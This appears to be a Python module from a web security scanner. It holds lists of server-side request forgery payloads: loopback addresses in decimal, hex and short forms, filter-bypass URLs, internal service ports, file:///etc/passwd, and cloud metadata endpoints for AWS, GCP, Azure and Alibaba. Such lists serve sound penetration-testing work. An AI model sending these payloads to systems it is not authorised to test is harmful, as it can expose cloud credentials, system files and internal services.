"""
SSRF payload collection with enhanced detection
"""

class SSRFPayloads:
    """SSRF payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SSRF payloads with unique markers"""
        return [
            'http://ssrf-test-internal.local/ssrf_marker_12345',
            'https://ssrf-test-internal.local/ssrf_marker_12345',
            'http://127.0.0.1:80/ssrf_marker_internal',
            'http://localhost:80/ssrf_marker_localhost',
            'http://0.0.0.0:80/ssrf_marker_zero',
            'http://[::1]:80/ssrf_marker_ipv6',
            'http://169.254.169.254/latest/meta-data/ssrf_marker_aws',
            'http://metadata.google.internal/computeMetadata/v1/ssrf_marker_gcp',
            'file:///etc/passwd#ssrf_marker_file',
            'ftp://ssrf-test.local/ssrf_marker_ftp'
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced SSRF payloads with bypass techniques"""
        return [
            'http://ssrf-bypass.127.0.0.1.nip.io/ssrf_marker_bypass',
            'http://127.1/ssrf_marker_short',
            'http://2130706433/ssrf_marker_decimal',  # 127.0.0.1 in decimal
            'http://0x7f000001/ssrf_marker_hex',      # 127.0.0.1 in hex
            'http://localhost.ssrf-test.local/ssrf_marker_subdomain',
            'http://127.0.0.1.ssrf-test.local/ssrf_marker_domain',
            'http://ssrf-test@127.0.0.1/ssrf_marker_userinfo',
            'http://127.0.0.1#ssrf-test.local/ssrf_marker_fragment',
            'http://127.0.0.1:8080/ssrf_marker_port',
            'http://127.0.0.1:22/ssrf_marker_ssh',
            'http://127.0.0.1:3306/ssrf_marker_mysql',
            'http://127.0.0.1:6379/ssrf_marker_redis'
        ]
    
    @staticmethod
    def get_cloud_metadata_payloads():
        """Get cloud metadata SSRF payloads"""
        return [
            'http://169.254.169.254/latest/meta-data/instance-id/ssrf_marker_aws_instance',
            'http://169.254.169.254/latest/user-data/ssrf_marker_aws_userdata',
            'http://metadata.google.internal/computeMetadata/v1/instance/ssrf_marker_gcp_instance',
            'http://169.254.169.254/metadata/instance/ssrf_marker_azure',
            'http://100.100.100.200/latest/meta-data/ssrf_marker_alibaba'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SSRF payloads"""
        payloads = []
        payloads.extend(SSRFPayloads.get_basic_payloads())
        payloads.extend(SSRFPayloads.get_advanced_payloads())
        payloads.extend(SSRFPayloads.get_cloud_metadata_payloads())
        return payloads
